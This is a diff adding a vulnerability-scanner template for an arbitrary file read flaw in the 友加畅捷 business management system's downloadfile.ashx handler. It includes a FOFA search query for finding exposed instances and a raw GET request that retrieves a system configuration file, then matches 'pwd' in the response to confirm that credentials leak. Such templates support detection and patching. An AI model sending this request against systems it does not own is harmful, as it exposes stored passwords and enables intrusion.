@@ -1,0 +1,24 @@
+id: youjia-changjie-downloadfile-file-read
+
+info:
+  name: "友加畅捷管理系统 downloadfile.ashx 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
+        友加畅捷管理系统为小微商贸流通企业提供财务业务一体化解决方案，集成进销存、财务、分销及移动管理功能，旨在优化企业运营效率与财务核算流程。该系统中的 downloadfile.ashx 组件因未正确实施文件访问控制策略，导致存在任意文件读取漏洞。攻击者可通过构造恶意请求，绕过文件访问控制机制，获取目标系统中的任意文件内容，包括系统配置文件及数据库配置文件等敏感数据。该漏洞的利用可能直接导致企业敏感信息泄露，威胁系统的机密性与数据完整性。
+  tags: 友加畅捷
+
+http:
+- raw:
+  - |
+    GET /Controllers/ajax/downloadfile.ashx?fileurl=config/sysconfig_zts.fig HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'pwd'
